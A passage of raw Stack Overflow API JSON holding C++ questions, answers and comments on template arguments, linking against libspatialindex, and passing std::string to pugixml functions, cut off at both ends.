"https://www.gravatar.com/avatar/9d1bf8d92bb2a0f4abe6f818c6dfce58?s=128&d=identicon&r=PG&f=1", "display_name": "YelizavetaYR", "link": "https://stackoverflow.com/users/3532205/yelizavetayr"}, "edited": false, "score": 1, "creation_date": 1429729495, "post_id": 29806503, "comment_id": 47741219, "body": "The point of templates are to create versions of a class (or function) with only slight variations (for example a storage class that can store integers or floats). start with reading the book &quot;tour of C++&quot;,  <a href=\"http://stackoverflow.com/questions/388242/the-definitive-c-book-guide-and-list\" title=\"the definitive c book guide and list\">stackoverflow.com/questions/388242/&hellip;</a>"}, {"owner": {"reputation": 1443, "user_id": 3532205, "user_type": "registered", "accept_rate": 96, "profile_image": "https://www.gravatar.com/avatar/9d1bf8d92bb2a0f4abe6f818c6dfce58?s=128&d=identicon&r=PG&f=1", "display_name": "YelizavetaYR", "link": "https://stackoverflow.com/users/3532205/yelizavetayr"}, "edited": false, "score": 0, "creation_date": 1429729665, "post_id": 29806503, "comment_id": 47741354, "body": "Correct, but your line of code suggests its a float, we want to set it up as a generic type it can be anything depending on run time. (the link takes me to a book,and I&#39;ve got books, and I&#39;ve got reading material)"}, {"owner": {"reputation": 1443, "user_id": 3532205, "user_type": "registered", "accept_rate": 96, "profile_image": "https://www.gravatar.com/avatar/9d1bf8d92bb2a0f4abe6f818c6dfce58?s=128&d=identicon&r=PG&f=1", "display_name": "YelizavetaYR", "link": "https://stackoverflow.com/users/3532205/yelizavetayr"}, "edited": false, "score": 0, "creation_date": 1429729991, "post_id": 29806503, "comment_id": 47741556, "body": "with the suggested changes - even if I have everything as T (which i did at some point and then changed back) I still get the same exact error messages. All coming from main. (your suggestion does fix it) but i&#39;m not sure i understand why I need that &lt;float&gt; there."}, {"owner": {"reputation": 23041, "user_id": 1149664, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/ac4f96b553d2e45776bd6235fee4222d?s=128&d=identicon&r=PG", "display_name": "Johan Lundberg", "link": "https://stackoverflow.com/users/1149664/johan-lundberg"}, "reply_to_user": {"reputation": 1443, "user_id": 3532205, "user_type": "registered", "accept_rate": 96, "profile_image": "https://www.gravatar.com/avatar/9d1bf8d92bb2a0f4abe6f818c6dfce58?s=128&d=identicon&r=PG&f=1", "display_name": "YelizavetaYR", "link": "https://stackoverflow.com/users/3532205/yelizavetayr"}, "edited": false, "score": 1, "creation_date": 1429730003, "post_id": 29806503, "comment_id": 47741563, "body": "&quot;a generic type it can be anything depending on run time&quot;:. Then templates is not what you are after... Templates are completely determined or specified at compile time. You can have FC&lt;float&gt; or FC&lt;int&gt; but not FC&lt;magic runtime&gt;."}, {"owner": {"reputation": 1443, "user_id": 3532205, "user_type": "registered", "accept_rate": 96, "profile_image": "https://www.gravatar.com/avatar/9d1bf8d92bb2a0f4abe6f818c6dfce58?s=128&d=identicon&r=PG&f=1", "display_name": "YelizavetaYR", "link": "https://stackoverflow.com/users/3532205/yelizavetayr"}, "edited": false, "score": 0, "creation_date": 1429730640, "post_id": 29806503, "comment_id": 47741970, "body": "yes, i&#39;m aware that a template value/how its used is determined at run time. what confuses me is then <code>FC &lt;float&gt;</code> what does this mean and why do we need to specify it. Isn&#39;t the <code>template &lt;class T&gt;</code>  enough to state that its a template class?"}, {"owner": {"reputation": 23041, "user_id": 1149664, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/ac4f96b553d2e45776bd6235fee4222d?s=128&d=identicon&r=PG", "display_name": "Johan Lundberg", "link": "https://stackoverflow.com/users/1149664/johan-lundberg"}, "reply_to_user": {"reputation": 1443, "user_id": 3532205, "user_type": "registered", "accept_rate": 96, "profile_image": "https://www.gravatar.com/avatar/9d1bf8d92bb2a0f4abe6f818c6dfce58?s=128&d=identicon&r=PG&f=1", "display_name": "YelizavetaYR", "link": "https://stackoverflow.com/users/3532205/yelizavetayr"}, "edited": false, "score": 0, "creation_date": 1429730951, "post_id": 29806503, "comment_id": 47742143, "body": "It is enough to state that it is a template class. but when you <i>use</i> it you need to specify what T shall be. As I said, it is not done at run-time. Template <i>functions</i> can <i>deduce</i> T based on arguments, but that is another story. This is well described in the first chapters of any good C++ book."}, {"owner": {"reputation": 1443, "user_id": 3532205, "user_type": "registered", "accept_rate": 96, "profile_image": "https://www.gravatar.com/avatar/9d1bf8d92bb2a0f4abe6f818c6dfce58?s=128&d=identicon&r=PG&f=1", "display_name": "YelizavetaYR", "link": "https://stackoverflow.com/users/3532205/yelizavetayr"}, "edited": false, "score": 0, "creation_date": 1429731024, "post_id": 29806503, "comment_id": 47742189, "body": "Thank you - but I thought the function call will decide what is done at run time. In other words if our function is <code>sum(3,5)</code> vs <code>sum(2.5,4.7)</code> that is when its decided. So we don&#39;t need to code in advance. It gets decided based on user input."}], "tags": [], "owner": {"reputation": 23041, "user_id": 1149664, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/ac4f96b553d2e45776bd6235fee4222d?s=128&d=identicon&r=PG", "display_name": "Johan Lundberg", "link": "https://stackoverflow.com/users/1149664/johan-lundberg"}, "is_accepted": true, "score": 4, "last_activity_date": 1429730358, "last_edit_date": 1429730358, "creation_date": 1429728893, "answer_id": 29806503, "question_id": 29806466, "link": "https://stackoverflow.com/questions/29806466/my-template-code-in-c-is-generating-odd-errors-i-cant-seem-to-resolve/29806503#29806503", "title": "My template code in C++ is generating odd errors I can&#39;t seem to resolve.", "body": "<p>you need to give a template argument \u00b4T\u00b4:</p>\n\n<pre><code>FC&lt;float&gt; ROI, AcidTestRatio; \n</code></pre>\n\n<p>but as alain points out, you are not using T yet, so you may as well instead remove <code>template &lt;class T&gt;</code> from the beginning of your code instead.</p>\n\n<p>Alternatively, you may want to use T as the type of the members instead of <code>double</code>:</p>\n\n<pre><code>template &lt;class T&gt; \nclass FC\n{\nprivate: \n    T netprofit, costofinvest;\n    T curras, invent, curliab;\npublic: \n\n    void ROI(T np, T ci)\n    {\n     netprofit = np; costofinvest = ci;\n    }\n\n    T getROI()\n    {\n     return (netprofit - costofinvest) / costofinvest;\n    }\n\n    void ATR(T ca, T inv, T cl)\n    {\n     curras = ca; invent = inv; curliab = cl;\n    }\n\n    T getATR()\n    {\n    return (curras - invent) / curliab;\n    }\n};\n</code></pre>\n\n<p><strong>Update</strong>:\n   <a href=\"http://ideone.com/WZpYuK\" rel=\"nofollow\">Full example here</a></p>\n"}], "owner": {"reputation": 1443, "user_id": 3532205, "user_type": "registered", "accept_rate": 96, "profile_image": "https://www.gravatar.com/avatar/9d1bf8d92bb2a0f4abe6f818c6dfce58?s=128&d=identicon&r=PG&f=1", "display_name": "YelizavetaYR", "link": "https://stackoverflow.com/users/3532205/yelizavetayr"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 63, "favorite_count": 0, "accepted_answer_id": 29806503, "answer_count": 1, "score": -4, "last_activity_date": 1429730358, "creation_date": 1429728745, "question_id": 29806466, "link": "https://stackoverflow.com/questions/29806466/my-template-code-in-c-is-generating-odd-errors-i-cant-seem-to-resolve", "title": "My template code in C++ is generating odd errors I can&#39;t seem to resolve.", "body": "<p>I am having some errors appear in my code and i can't figure them out. I reduced my code down to the very basic simple functions/class calls but still have issues with this. </p>\n\n<pre><code>#include &lt;iostream&gt;\nusing namespace std;\n\ntemplate &lt;class T&gt; \n\nclass FC\n{\nprivate: \n    double netprofit, costofinvest;\n    double curras, invent, curliab;\npublic: \n\n    void ROI(double np, double ci)\n    {\n     netprofit = np; costofinvest = ci;\n    }\n\n    double getROI()\n    {\n     return (netprofit - costofinvest) / costofinvest;\n    }\n\n    void ATR(double ca, double inv, double cl)\n    {\n     curras = ca; invent = inv; curliab = cl;\n    }\n\n    double getATR()\n    {\n    return (curras - invent) / curliab;\n    }\n\n};\n\n\nint main()\n{\n FC ROI, AcidTestRatio; \n\n ROI.ROI(27, 288);\n cout &lt;&lt; ROI.getROI() &lt;&lt; endl;\n\n AcidTestRatio.ATR(77, 2l, 344);\n cout &lt;&lt; AcidTestRatio.getATR() &lt;&lt; endl;\n\n\nreturn 0;\n}\n</code></pre>\n\n<p>The errors I get look like this:</p>\n\n<pre><code>In function 'int main()':\n39:22: error: missing template arguments before 'ROI'\n41:2: error: 'ROI' was not declared in this scope\n44:2: error: 'AcidTestRatio' was not declared in this scope\n</code></pre>\n"}, {"tags": ["c++", "spatial-index"], "comments": [{"owner": {"reputation": 192, "user_id": 1021267, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/f7decd43bd994cc7fcf1af0e18f67f32?s=128&d=identicon&r=PG", "display_name": "itachi", "link": "https://stackoverflow.com/users/1021267/itachi"}, "edited": false, "score": 0, "creation_date": 1429729272, "post_id": 29806367, "comment_id": 47741075, "body": "Did you include the spatialindex namespace?"}, {"owner": {"reputation": 620, "user_id": 4575304, "user_type": "registered", "profile_image": "https://graph.facebook.com/864249376951568/picture?type=large", "display_name": "Mel Viso Martinez", "link": "https://stackoverflow.com/users/4575304/mel-viso-martinez"}, "edited": false, "score": 1, "creation_date": 1429730268, "post_id": 29806367, "comment_id": 47741713, "body": "The error says that the linker dont find the corresponding code. Please try changing the order : g++ spatial.cpp -lspatialindex  -o spatial I&#39;m not very confident  with single line compiling&amp;link. I always use two pass: first compile and then link objects with required libraries."}, {"owner": {"reputation": 368, "user_id": 1102000, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/a93da5f1dbe769be3a5190b5df474c89?s=128&d=identicon&r=PG", "display_name": "Patrick64", "link": "https://stackoverflow.com/users/1102000/patrick64"}, "reply_to_user": {"reputation": 192, "user_id": 1021267, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/f7decd43bd994cc7fcf1af0e18f67f32?s=128&d=identicon&r=PG", "display_name": "itachi", "link": "https://stackoverflow.com/users/1021267/itachi"}, "edited": false, "score": 0, "creation_date": 1429732791, "post_id": 29806367, "comment_id": 47743342, "body": "Thanks for the suggestion @itachi, I tried adding the namespace SpatialIndex (I edited the question above to show this too) but still no luck. How can I tell what namespace SIDX_Version is in? It&#39;s not clear from the docs <a href=\"http://libspatialindex.github.io/doxygen/sidx__api_8h.html\" rel=\"nofollow noreferrer\">libspatialindex.github.io/doxygen/sidx__api_8h.html</a>"}, {"owner": {"reputation": 368, "user_id": 1102000, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/a93da5f1dbe769be3a5190b5df474c89?s=128&d=identicon&r=PG", "display_name": "Patrick64", "link": "https://stackoverflow.com/users/1102000/patrick64"}, "reply_to_user": {"reputation": 620, "user_id": 4575304, "user_type": "registered", "profile_image": "https://graph.facebook.com/864249376951568/picture?type=large", "display_name": "Mel Viso Martinez", "link": "https://stackoverflow.com/users/4575304/mel-viso-martinez"}, "edited": false, "score": 0, "creation_date": 1429732896, "post_id": 29806367, "comment_id": 47743414, "body": "@MelVisoMartinez, I tried it the other way around and separating the compiling&amp;link (as shown in the edit to question I did) but no luck."}], "answers": [{"comments": [{"owner": {"reputation": 368, "user_id": 1102000, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/a93da5f1dbe769be3a5190b5df474c89?s=128&d=identicon&r=PG", "display_name": "Patrick64", "link": "https://stackoverflow.com/users/1102000/patrick64"}, "edited": false, "score": 0, "creation_date": 1429735433, "post_id": 29807822, "comment_id": 47744931, "body": "Same problem I&#39;m afraid, although that folder does contain <code>libspatialindex.a</code> and similar files so maybe it helps to get closer to the solution."}], "tags": [], "owner": {"reputation": 30517, "user_id": 774499, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/sju2a.jpg?s=128&g=1", "display_name": "David Hammen", "link": "https://stackoverflow.com/users/774499/david-hammen"}, "is_accepted": false, "score": 0, "last_activity_date": 1429733449, "creation_date": 1429733449, "answer_id": 29807822, "question_id": 29806367, "link": "https://stackoverflow.com/questions/29806367/undefined-reference-to-libspatialindex-functions-in-c/29807822#29807822", "title": "Undefined reference to libspatialindex functions in C++", "body": "<p>By default, the <code>libspatialindex</code> install target is <code>/usr/local</code>. You didn't override that in your invocation of <code>./configure</code>, so that's where <code>make install</code> will install things.</p>\n\n<p>The compiler knows to look for include files in <code>/usr/local/include</code>, so compilation isn't a problem. It however does not know to look for libraries in <code>usr/local/lib</code>. A simple fix is to add that to your link step:</p>\n\n<pre><code>g++ -o spatial spatial.o -lspatialindex -lm -L/usr/local/lib\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 368, "user_id": 1102000, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/a93da5f1dbe769be3a5190b5df474c89?s=128&d=identicon&r=PG", "display_name": "Patrick64", "link": "https://stackoverflow.com/users/1102000/patrick64"}, "edited": false, "score": 1, "creation_date": 1429735338, "post_id": 29808123, "comment_id": 47744874, "body": "Thanks, I tried <code>gcc -g spatial.c -o spatial -lspatialindex</code> but it gave me the error <code>In file included from &#47;usr&#47;local&#47;include&#47;spatialindex&#47;SpatialIndex.h:30:0,                  from &#47;usr&#47;local&#47;include&#47;spatialindex&#47;capi&#47;sidx_config.h:56,                  from &#47;usr&#47;local&#47;include&#47;spatialindex&#47;capi&#47;sidx_api.h:34,                  from spatial.c:1: &#47;usr&#47;local&#47;include&#47;spatialindex&#47;tools&#47;Tools.h:59:20: fatal error: iostream: No such file or directory</code>"}, {"owner": {"reputation": 620, "user_id": 4575304, "user_type": "registered", "profile_image": "https://graph.facebook.com/864249376951568/picture?type=large", "display_name": "Mel Viso Martinez", "link": "https://stackoverflow.com/users/4575304/mel-viso-martinez"}, "reply_to_user": {"reputation": 368, "user_id": 1102000, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/a93da5f1dbe769be3a5190b5df474c89?s=128&d=identicon&r=PG", "display_name": "Patrick64", "link": "https://stackoverflow.com/users/1102000/patrick64"}, "edited": false, "score": 0, "creation_date": 1429735901, "post_id": 29808123, "comment_id": 47745214, "body": "I am really confused... The example you referred is typical c and is what &quot;capi&quot; suggest, but these includes are &#161;using classes!. I&#39;m sorry I will delete my reponse later. Plese do a nm over the library for checking if  the missing symbol is here and let me know if it&#39;s inside or not."}, {"owner": {"reputation": 620, "user_id": 4575304, "user_type": "registered", "profile_image": "https://graph.facebook.com/864249376951568/picture?type=large", "display_name": "Mel Viso Martinez", "link": "https://stackoverflow.com/users/4575304/mel-viso-martinez"}, "reply_to_user": {"reputation": 368, "user_id": 1102000, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/a93da5f1dbe769be3a5190b5df474c89?s=128&d=identicon&r=PG", "display_name": "Patrick64", "link": "https://stackoverflow.com/users/1102000/patrick64"}, "edited": false, "score": 0, "creation_date": 1429736342, "post_id": 29808123, "comment_id": 47745524, "body": "@Patrick64 Do you have some like libspatialindex_c? I have seen an example that seems to link against libspatialindex_c instead of libspatialindex."}, {"owner": {"reputation": 368, "user_id": 1102000, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/a93da5f1dbe769be3a5190b5df474c89?s=128&d=identicon&r=PG", "display_name": "Patrick64", "link": "https://stackoverflow.com/users/1102000/patrick64"}, "edited": false, "score": 0, "creation_date": 1429737831, "post_id": 29808123, "comment_id": 47746350, "body": "Yes there is a libspatialindex_c.a file in /usr/local/lib folder, <code>gcc -g spatial.c -lspatialindex_c -o spatial</code> does the same as before."}, {"owner": {"reputation": 620, "user_id": 4575304, "user_type": "registered", "profile_image": "https://graph.facebook.com/864249376951568/picture?type=large", "display_name": "Mel Viso Martinez", "link": "https://stackoverflow.com/users/4575304/mel-viso-martinez"}, "reply_to_user": {"reputation": 368, "user_id": 1102000, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/a93da5f1dbe769be3a5190b5df474c89?s=128&d=identicon&r=PG", "display_name": "Patrick64", "link": "https://stackoverflow.com/users/1102000/patrick64"}, "edited": false, "score": 0, "creation_date": 1429737922, "post_id": 29808123, "comment_id": 47746390, "body": "Ok, but I was wrong before and you need to use your g++ compilation (with cpp source file) but linking against this other lib. :)"}, {"owner": {"reputation": 620, "user_id": 4575304, "user_type": "registered", "profile_image": "https://graph.facebook.com/864249376951568/picture?type=large", "display_name": "Mel Viso Martinez", "link": "https://stackoverflow.com/users/4575304/mel-viso-martinez"}, "reply_to_user": {"reputation": 368, "user_id": 1102000, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/a93da5f1dbe769be3a5190b5df474c89?s=128&d=identicon&r=PG", "display_name": "Patrick64", "link": "https://stackoverflow.com/users/1102000/patrick64"}, "edited": false, "score": 1, "creation_date": 1429738434, "post_id": 29808123, "comment_id": 47746652, "body": "If this fails due to missing symbols, include both libraries with -lspatialindex_c and -lspatialindex (in this order). I must left for rest. I hope this helps."}, {"owner": {"reputation": 368, "user_id": 1102000, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/a93da5f1dbe769be3a5190b5df474c89?s=128&d=identicon&r=PG", "display_name": "Patrick64", "link": "https://stackoverflow.com/users/1102000/patrick64"}, "edited": false, "score": 0, "creation_date": 1429739749, "post_id": 29808123, "comment_id": 47747275, "body": "You&#39;ve cracked it, thanks so much. I did <code>g++ spatial.cpp -lspatialindex_c -lspatialindex -L&#47;usr&#47;local&#47;lib -o spatial</code> and it works! I also needed to run <code>sudo ldconfig</code> before running the program."}, {"owner": {"reputation": 30517, "user_id": 774499, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/sju2a.jpg?s=128&g=1", "display_name": "David Hammen", "link": "https://stackoverflow.com/users/774499/david-hammen"}, "reply_to_user": {"reputation": 368, "user_id": 1102000, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/a93da5f1dbe769be3a5190b5df474c89?s=128&d=identicon&r=PG", "display_name": "Patrick64", "link": "https://stackoverflow.com/users/1102000/patrick64"}, "edited": false, "score": 0, "creation_date": 1429741056, "post_id": 29808123, "comment_id": 47747876, "body": "@Patrick64 - That you needed to run sudo ldconfig sounds like a bug in the install. I don&#39;t know what libspatialindex is, but this happens a lot with &quot;free&quot; software."}], "tags": [], "owner": {"reputation": 620, "user_id": 4575304, "user_type": "registered", "profile_image": "https://graph.facebook.com/864249376951568/picture?type=large", "display_name": "Mel Viso Martinez", "link": "https://stackoverflow.com/users/4575304/mel-viso-martinez"}, "is_accepted": true, "score": 1, "last_activity_date": 1429736975, "last_edit_date": 1429736975, "creation_date": 1429734443, "answer_id": 29808123, "question_id": 29806367, "link": "https://stackoverflow.com/questions/29806367/undefined-reference-to-libspatialindex-functions-in-c/29808123#29808123", "title": "Undefined reference to libspatialindex functions in C++", "body": "<p>The problem is about linking phase. The library is correctly found because the compiler dont throws alert(s) of that kind of situation (I just made a test now). \ndo a</p>\n\n<pre><code>&gt; nm libspatialindex |grep SIDX_Version\n</code></pre>\n\n<p>for checking the symbol existence in the library you are using. May be libspatialindex_c instead?</p>\n"}], "owner": {"reputation": 368, "user_id": 1102000, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/a93da5f1dbe769be3a5190b5df474c89?s=128&d=identicon&r=PG", "display_name": "Patrick64", "link": "https://stackoverflow.com/users/1102000/patrick64"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 713, "favorite_count": 0, "accepted_answer_id": 29808123, "answer_count": 2, "score": 0, "last_activity_date": 1589150347, "creation_date": 1429728458, "last_edit_date": 1589150347, "question_id": 29806367, "link": "https://stackoverflow.com/questions/29806367/undefined-reference-to-libspatialindex-functions-in-c", "title": "Undefined reference to libspatialindex functions in C++", "body": "<p>I'm just getting started with libspatialindex. I ran through the <a href=\"http://libspatialindex.github.io/install.html\" rel=\"nofollow noreferrer\">instructions to install</a> and it installed ok on ubuntu with the following commands (except I couldn't find autogen.sh which it mentions).</p>\n\n<pre><code>./configure\nmake\nsudo make install\n</code></pre>\n\n<p>then I made a very simple program to test it as follows (based on <a href=\"https://github.com/libspatialindex/libspatialindex/wiki/Simple-Tutorial\" rel=\"nofollow noreferrer\">this</a>)</p>\n\n<pre><code>#include &lt;spatialindex/capi/sidx_api.h&gt;\nusing namespace SpatialIndex;\nint main(int argc, char* argv[])\n{\n    char* pszVersion = SIDX_Version();\n}\n</code></pre>\n\n<p>and compile as follows:</p>\n\n<pre><code>g++ -lspatialindex spatial.cpp -o spatial\n</code></pre>\n\n<p>and it gives me the error:</p>\n\n<pre><code>/tmp/ccACK3p4.o: In function `main':\nspatial.cpp:(.text+0xa): undefined reference to `SIDX_Version'\ncollect2: ld returned 1 exit status\n</code></pre>\n\n<p>I've tried many different things such as using cmake instead and installing it a different folder but no luck. Any ideas?</p>\n\n<p>EDIT:</p>\n\n<p>Added the namespace SpatialIndex above and I also tried the following, but still not luck:</p>\n\n<pre><code>g++ -c -o spatial.o spatial.cpp\ng++ -o spatial spatial.o -lspatialindex -lm\n</code></pre>\n"}, {"tags": ["c++", "xml", "c++11", "xml-parsing"], "comments": [{"owner": {"reputation": 325758, "user_id": 415784, "user_type": "registered", "accept_rate": 79, "profile_image": "https://i.stack.imgur.com/2WX9Z.jpg?s=128&g=1", "display_name": "Nawaz", "link": "https://stackoverflow.com/users/415784/nawaz"}, "edited": false, "score": 1, "creation_date": 1429728735, "post_id": 29806337, "comment_id": 47740745, "body": "Please see the line where it shows the error.... and where you&#39;re actually changing your code."}, {"owner": {"user_type": "does_not_exist", "display_name": "user2249683"}, "edited": false, "score": 0, "creation_date": 1429728845, "post_id": 29806337, "comment_id": 47740812, "body": "Just a guess: <code>const auto&amp;</code>"}, {"owner": {"reputation": 2097, "user_id": 2729481, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/daf7c8512fdec0bdd3c261e2d1105c62?s=128&d=identicon&r=PG&f=1", "display_name": "J.Zil", "link": "https://stackoverflow.com/users/2729481/j-zil"}, "edited": false, "score": 0, "creation_date": 1429728927, "post_id": 29806337, "comment_id": 47740855, "body": "@DieterL&#252;cking <code>const auto id = node.child_value(tagMap[3].c_str());</code> Like this? I get the same error"}, {"owner": {"reputation": 2097, "user_id": 2729481, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/daf7c8512fdec0bdd3c261e2d1105c62?s=128&d=identicon&r=PG&f=1", "display_name": "J.Zil", "link": "https://stackoverflow.com/users/2729481/j-zil"}, "reply_to_user": {"reputation": 325758, "user_id": 415784, "user_type": "registered", "accept_rate": 79, "profile_image": "https://i.stack.imgur.com/2WX9Z.jpg?s=128&g=1", "display_name": "Nawaz", "link": "https://stackoverflow.com/users/415784/nawaz"}, "edited": false, "score": 0, "creation_date": 1429729025, "post_id": 29806337, "comment_id": 47740921, "body": "@Nawaz I see the line with the error but I don&#39;t understand it."}, {"owner": {"user_type": "does_not_exist", "display_name": "user2249683"}, "edited": false, "score": 0, "creation_date": 1429729095, "post_id": 29806337, "comment_id": 47740963, "body": "@JamesWillson +&amp; (in your original code)"}], "answers": [{"comments": [{"owner": {"reputation": 2097, "user_id": 2729481, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/daf7c8512fdec0bdd3c261e2d1105c62?s=128&d=identicon&r=PG&f=1", "display_name": "J.Zil", "link": "https://stackoverflow.com/users/2729481/j-zil"}, "edited": false, "score": 0, "creation_date": 1429729376, "post_id": 29806585, "comment_id": 47741146, "body": "Thank you very much. I tried this code, but it gives me this error: <code>src&#47;main.cpp:21:9: error: non-const lvalue reference to type &#39;const char *&#39; cannot bind to a temporary of type       &#39;const char_t *&#39; (aka &#39;const char *&#39;)                 auto&amp; id = node.child_value(tagMap[3].c_str());                       ^    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ </code> Does tis mean it should be for <code>(const &amp;auto...</code>"}, {"owner": {"reputation": 245138, "user_id": 2069064, "user_type": "registered", "accept_rate": 73, "profile_image": "https://i.stack.imgur.com/e4V2X.jpg?s=128&g=1", "display_name": "Barry", "link": "https://stackoverflow.com/users/2069064/barry"}, "reply_to_user": {"reputation": 2097, "user_id": 2729481, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/daf7c8512fdec0bdd3c261e2d1105c62?s=128&d=identicon&r=PG&f=1", "display_name": "J.Zil", "link": "https://stackoverflow.com/users/2729481/j-zil"}, "edited": false, "score": 0, "creation_date": 1429729452, "post_id": 29806585, "comment_id": 47741194, "body": "@JamesWillson The error states that you&#39;re binding a non-const reference to a temporary. What does that suggest to you that the fix is?"}, {"owner": {"reputation": 2097, "user_id": 2729481, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/daf7c8512fdec0bdd3c261e2d1105c62?s=128&d=identicon&r=PG&f=1", "display_name": "J.Zil", "link": "https://stackoverflow.com/users/2729481/j-zil"}, "edited": false, "score": 0, "creation_date": 1429729515, "post_id": 29806585, "comment_id": 47741233, "body": "I&#39;ll try a few things and get back to you"}, {"owner": {"reputation": 2097, "user_id": 2729481, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/daf7c8512fdec0bdd3c261e2d1105c62?s=128&d=identicon&r=PG&f=1", "display_name": "J.Zil", "link": "https://stackoverflow.com/users/2729481/j-zil"}, "edited": false, "score": 0, "creation_date": 1429729660, "post_id": 29806585, "comment_id": 47741349, "body": "Putting const here <code>for (const auto&amp; node....</code> and here <code>auto id = node...</code> worked! Thank you"}], "tags": [], "owner": {"reputation": 245138, "user_id": 2069064, "user_type": "registered", "accept_rate": 73, "profile_image": "https://i.stack.imgur.com/e4V2X.jpg?s=128&g=1", "display_name": "Barry", "link": "https://stackoverflow.com/users/2069064/barry"}, "is_accepted": true, "score": 2, "last_activity_date": 1429729182, "creation_date": 1429729182, "answer_id": 29806585, "question_id": 29806337, "link": "https://stackoverflow.com/questions/29806337/no-viable-conversion-from-mapped-type/29806585#29806585", "title": "No viable conversion from &#39;mapped_type&#39;", "body": "<p>If you read the error closely</p>\n\n<pre><code>src/main.cpp:20:30: error: no viable conversion from 'mapped_type' (aka 'std::__1::basic_string&lt;char&gt;') to\n  'const char_t *' (aka 'const char *')\n    for (auto&amp; node: doca.child(tagMap[1]).children(tagMap[2])) {\n                                ^~~~~~~~~\n</code></pre>\n\n<p>You'll see that you're passing a <code>std::string</code> to something that expects a <code>const char*</code>. Specifically:</p>\n\n<pre><code>doca.child(tagMap[1])\n</code></pre>\n\n<p><code>tagMap[1]</code> is a <code>std::string</code> and <code>child()</code> expects a <code>const char*</code>. So:</p>\n\n<pre><code>for (auto&amp; node: doca.child(tagMap[1].c_str()).children(tagMap[2].c_str())) {\n</code></pre>\n"}], "owner": {"reputation": 2097, "user_id": 2729481, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/daf7c8512fdec0bdd3c261e2d1105c62?s=128&d=identicon&r=PG&f=1", "display_name": "J.Zil", "link": "https://stackoverflow.com/users/2729481/j-zil"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1505, "favorite_count": 1, "accepted_answer_id": 29806585, "answer_count": 1, "score": 0, "last_activity_date": 1429729182, "creation_date": 1429728373, "question_id": 29806337, "link": "https://stackoverflow.com/questions/29806337/no-viable-conversion-from-mapped-type", "title": "No viable conversion from &#39;mapped_type&#39;", "body": "<p>This is my code to compare XML files, using a map to define xml tag names to content.</p>\n\n<pre><code>#include \"pugi/pugixml.hpp\"\n\n#include &lt;iostream&gt;\n#include &lt;string&gt;\n#include &lt;map&gt;\n\nusing namespace std;\n\nint main()\n{\n    pugi::xml_document doca, docb;\n    std::map&lt;std::string, pugi::xml_node&gt; mapa, mapb;\n    std::map&lt;int, std::string&gt; tagMap {make_pair(1, \"data\"), make_pair(2, \"entry\"), make_pair(3, \"id\"), make_pair(4, \"content\")};\n\n    if (!doca.load_file(\"a.xml\") || !docb.load_file(\"b.xml\")) {\n        std::cout &lt;&lt; \"Can't find input files\";\n        return 1;\n    }\n\n    for (auto&amp; node: doca.child(tagMap[1]).children(tagMap[2])) {\n        auto id = node.child_value(tagMap[3]);\n        mapa[id] = node;\n    }\n\n    for (auto&amp; node: docb.child(tagMap[1]).children(tagMap[2])) {\n        auto idcs = node.child_value(tagMap[3]);\n        if (!mapa.erase(idcs)) {\n            mapb[idcs] = node;\n        }\n    }\n}\n</code></pre>\n\n<p>The error I get is this:</p>\n\n<pre><code>src/main.cpp:20:30: error: no viable conversion from 'mapped_type' (aka 'std::__1::basic_string&lt;char&gt;') to\n      'const char_t *' (aka 'const char *')\n        for (auto&amp; node: doca.child(tagMap[1]).children(tagMap[2])) {\n                                    ^~~~~~~~~\n</code></pre>\n\n<p>On recommendation I tried this approach:</p>\n\n<pre><code>        auto id = node.child_value(tagMap[3].c_str());\n</code></pre>\n\n<p>But I still get same error. It seems me trying to use a map to define the tag names has caused a lot of issues over just hardcoding it, but mapping it seems logical since in the future I will move the map to an external file so I can run the program for different XML tags without recompiling each time.</p>\n"}, {"tags": ["java", "c++", "compilation"], "answers": [{"comments": [{"owner": {"reputation": 115, "user_id": 2414577, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/a96ff350ed64a7520c3e6fb0479e13b9?s=128&d=identicon&r=PG&f=1", "display_name": "Teva Velu", "link": "https://stackoverflow.com/users/2414577/teva-velu"}, "edited": false, "score": 0, "creation_date": 1429729908, "post_id": 29806335, "comment_id": 47741508, "body": "I added the header in the C++ solution folder. I am still getting the same error."}, {"owner": {"reputation": 10264, "user_id": 1655700, "user_type": 